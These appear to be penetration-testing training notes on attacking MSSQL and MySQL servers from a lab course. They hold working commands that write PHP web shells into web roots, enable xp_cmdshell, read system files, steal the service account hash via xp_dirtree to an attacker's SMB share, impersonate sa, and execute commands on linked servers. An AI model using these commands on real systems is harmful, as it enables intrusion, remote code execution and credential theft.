
MSSQL - TCP/1433 (or TCP/2433 in hidden mode) and UDP/1434

MySQL - TCP/3306

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125
```

Authentication

MSSQL Authentication types:
- Windows authentication mode (integrated with AD)
- Mixed mode (AD and SQl server username:password pairs)

MySQL:
- Username and password
- Windows authentication (plugin required)

Misconfigurations:
- Anonymous access
- user without a password
- any user, group, or machine is allowed to access the SQL server

Privileges:
- Read or change the contents of a database
- Read or change the server configuration
- Execute commands
- Read local files
- Communicate with other databases
- Capture the local system hash
- Impersonate existing users
- Gain access to other networks

##### Protocol Specific Attacks

Read/Change the Database

MySQL
```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```
MSSQL
```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

MSSQL from Linux
```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7
```

Windows Authentication - Local account
```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
(SERVERNAME\\\accountname or .\\\\accountname)


##### SQL Default Databases
MySQL
- myssql
- information_schema
- performance_schema
- sys

MSSQL
- master
- msdb
- model
- resource
- tempdb

##### SQL Syntax

##### MySQL
```shell-session
SHOW DATABASES;
```
```shell-session
USE htbusers;
```
```shell-session
SHOW TABLES;
```
```shell-session
SELECT * FROM users;
```

Write Local File
```shell-session
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Web shell
SELECT '<?php if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; } ?>' 
INTO OUTFILE 'C:/xampp/htdocs/webshell.php';


Check Secure File Privileges
```shell-session
show variables like "secure_file_priv";
```
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

Read local files
```shell-session
select LOAD_FILE("/etc/passwd");
```





##### MSSQL
If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax
```cmd-session
SELECT name FROM master.dbo.sysdatabases
```
```cmd-session
GO
```
```cmd-session
USE htbusers
```
```cmd-session
GO
```
```cmd-session
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
```
```cmd-session
GO
```
```cmd-session
SELECT * FROM users
```
```cmd-session
go
```
```cmd-session
xp_cmdshell 'whoami'
```
```cmd-session
GO
```

If xp_cmdshell is not enabled, we enable it with:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

To write files, me must enable Ole Automation Procedures
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
Create a file
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

Read local files
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```


#### Capture MSSQL Service Hash

Start
- Responder OR
- impacket-smbserver

```shell-session
sudo responder -I tun0
```
```shell-session
sudo impacket-smbserver share ./ -smb2support
```


XP_DIRTREE Hash Stealing
```cmd-session
1> EXEC master..xp_dirtree '\\my_ip_address\share\'
2> GO
```

XP_SUBDIRS Hash Stealing
```cmd-session
1> EXEC master..xp_subdirs '\\my_ip_address\share\'
2> GO
```

#### Impersonate Existing Users with MSSQL

Identify Users that We Can Impersonate
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Verifying our Current User and Role
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

(We can impersonate sa which has sysadmin access)
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

Connect to master DB with 'USE master' if presented with error

To return to our previous user, use 'REVERT'

Identify linked Servers in MSSQL
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO
```
Output:
- 1 = remote server
- 0 = linked server

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
**NOTE you must use two single quotes to execute commands on linked server
Example: 
EXECUTE ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]

